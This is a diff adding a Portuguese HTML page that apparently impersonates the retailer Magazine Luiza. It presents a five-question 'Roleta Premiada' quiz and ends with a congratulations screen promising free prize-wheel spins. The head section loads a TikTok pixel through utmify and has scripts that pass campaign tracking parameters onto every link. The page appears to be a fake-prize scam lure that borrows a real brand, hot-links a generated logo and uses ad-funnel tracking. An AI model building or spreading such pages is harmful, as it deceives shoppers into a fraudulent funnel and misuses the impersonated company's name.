@@ -1,0 +1,229 @@
+﻿
+<!DOCTYPE html><html lang="pt-br"><head>
+    <html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sua Página</title>
+</head>
+    <script>
+    var timer = setInterval(function () {
+        const location = new URL(document.location.href);
+        const fields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
+        var links = document.getElementsByTagName("a");
+
+        for (var i = 0, n = links.length; i < n; i++) {
+            if (links[i].href.includes("#")) continue;
+            if (links[i].href) {
+                let link = new URL(links[i].href);
+                fields.forEach(field => {
+                    if (location.searchParams.get(field))
+                        link.searchParams.set(field, location.searchParams.get(field));
+                });
+                let href = link.href;
+                links[i].href = href;
+            }
+        }
+    }, 500);
+</script>
+<script>
+  window.tikTokPixelId = "69313ac9bac229d5494bcf6f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+
+    <link rel="icon" href="images/logo5.webp" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/favico.jpg">
+
+    <link rel="stylesheet" href="../../css2-30?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+    <title>Magazine Luiza</title>
+    <script src="js/latest.js" data-utmify-prevent-subids="" data-utmify-fast-start="" async="" defer=""></script>
+    <script>
+        function onLoad() {
+            var links = document.getElementsByTagName("a");
+
+            for (var i = 0, n = links.length; i < n; i++) {
+            if (links[i].href.includes("#")) {
+                continue;
+            }
+
+            var href =
+                links[i].href.trim() +
+                (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+                document.location.search.replace("?", "").toString();
+            links[i].href = href;
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", onLoad);
+    </script>
+   
+</html></head>
+<body>
+<nav class="navbar" style="padding-top: 15px; margin-bottom: 5px; display: flex; align-items: center; justify-content: space-between; background-color: #ffffff;">
+    <!-- Logo da esquerda -->
+    <div class="menu-icon" style="padding-left: 3%;">
+        <img src="images/logo5.webp" style="height: 3vh;" alt="Logo Esquerda">
+    </div>
+
+    <!-- Espaço central vazio -->
+    <div></div>
+
+    <!-- Logo da direita + ícone de menu -->
+    <img src="https://i.postimg.cc/xCF04yfM/Chat-GPT-Image-4-de-dez-de-2025-02-38-19.png" 
+         style="height: 5vh; object-fit: contain;" 
+         alt="Logo Direita">
+</div>
+</nav>
+
+    <div class="pergunta"> 
+
+        <!--------------------- Barra de progresso --------------------->
+
+        <div style="padding-bottom: 20px;"></div>
+
+        <div id="respondaeganhe" class="respondaeganhe">
+            <p style="font-family: 'GellixSemiBold';">Responda e ganhe!</p>
+        </div>
+
+        <div id="barradeprogresso" class="container" style="padding-bottom: 5px;">
+            <div class="progress-bar-container">
+                <div class="progress-bar">
+                    <div class="progress" id="progress" style="width: 16.6667%;"></div>
+                </div>
+                <div class="progress-text" id="progress-text">17 %</div>
+            </div>
+        </div>
+
+
+<!--------------------- Pergunta 1 --------------------->
+<div id="p1">
+    <img src="images/quiz1.webp" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+    <p class="pergunta_title">Você já ouviu falar da <b>Roleta Premiada da Magazine Luiza?</b></p>
+    <ul class="quiz-options">
+        <li><button>Sim! Estou animado(a) pra girar!</button></li>
+        <li><button>Ouvi, mas ainda não participei</button></li>
+        <li><button>Não, é a primeira vez que vejo</button></li>
+        <li><button>Quero saber mais!</button></li>
+    </ul>
+</div>
+
+<!--------------------- Pergunta 2 --------------------->
+<div id="p2" style="display: none">
+    <img src="images/quiz4.webp" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+    <p class="pergunta_title">O que mais te chama atenção na Magazine Luiza?</p>
+    <ul class="quiz-options">
+        <li><button>Os descontos de até 90%</button></li>
+        <li><button>Frete grátis e cupons</button></li>
+        <li><button>As ofertas relâmpago</button></li>
+        <li><button>As marcas oficiais em promoção</button></li>
+    </ul>
+</div>
+
+<!--------------------- Pergunta 3 --------------------->
+<div id="p3" style="display: none">
+    <img src="images/quiz6.webp" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+    <p class="pergunta_title">Você já aproveitou alguma promoção da Magazine Luiza?</p>
+    <ul class="quiz-options">
+        <li><button>Sim, todos os anos!</button></li>
+        <li><button>Sim, esse ano estou participando</button></li>
+        <li><button>Ainda não, mas quero participar</button></li>
+        <li><button>Não costumo aproveitar</button></li>
+    </ul>
+</div>
+
+<!--------------------- Pergunta 4 --------------------->
+<div id="p4" style="display: none">
+    <img src="images/quiz5.webp" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+    <p class="pergunta_title">Qual tipo de produto você mais quer encontrar em promoção?</p>
+    <ul class="quiz-options">
+        <li><button>Eletrônicos e gadgets</button></li>
+        <li><button>Moda e beleza</button></li>
+        <li><button>Casa e decoração</button></li>
+        <li><button>Brinquedos e presentes</button></li>
+    </ul>
+</div>
+
+<!--------------------- Pergunta 5 --------------------->
+<div id="p5" style="display: none">
+    <img src="images/quiz2.webp" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+    <p class="pergunta_title">Como você ficou sabendo da <b>Roleta Premiada Magazine Luiza</b>?</p>
+    <ul class="quiz-options">
+        <li><button>Pelo Instagram</button></li>
+        <li><button>Pelo TikTok</button></li>
+        <li><button>Pelo Facebook</button></li>
+        <li><button>Recebi o link por WhatsApp</button></li>
+    </ul>
+</div>
+
+        <!--------------------- Receber de Graça --------------------->
+
+        <div id="p6" style="display: none">
+        <div class="respondaeganhe">
+            <p style="font-family: 'GellixSemiBold';">Parabéns!</p>
+        </div>
+
+          <img src="images/quiz3.webp" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+          
+
+          <p style="padding: 25px;">
+            Como forma de agradecimento, você ganhou <strong>um acesso grátis a nossa promoção "da Magazine Luiza" nela você pode escolher rodar 2 vezes a roleta, aproveite!</strong>
+
+            <br><br>
+            Esperamos que você aproveite ao máximo cada produto e que eles tragam ainda mais diversão para você e sua família.
+            <br><br>
+
+          </p>
+      </div>
+
+
+        <!--------------------- Botão de seguir --------------------->
+    
+        <div class="question-container">
+                <div class="question" id="question1" style="display:none;"></div>
+                <div class="question" id="question2" style="display:none;"></div>
+                <div class="question" id="question3" style="display:none;"></div>
+                <div class="question" id="question4" style="display:none;"></div>
+                <div class="question" id="question5" style="display:none;"></div>
+                <div class="question" id="question6" style="display:none;"></div>
+        </div>
+
+        <div style="padding-bottom: 10px;"></div>
+    
+        <button class="next-button" id="next-button" onclick="nextQuestion()">Próximo</button>
+        
+        <div style="padding-bottom: 20px;"></div>
+
+        
+    </div>
+
+    
+
+
+    <script src="js/scripts.js"></script>
+
+
+
+
+    <script>
+        document.querySelectorAll('.quiz-options button').forEach(button => {
+            button.addEventListener('click', () => {
+                document.querySelectorAll('.quiz-options button').forEach(btn => btn.style.borderColor = '#ccc');
+                button.style.borderColor = '#1277FF';
+                button.style.backgroundColor = '#1277FF';
+            });
+        });
+    </script>
+
+
+
+
+</body></html>
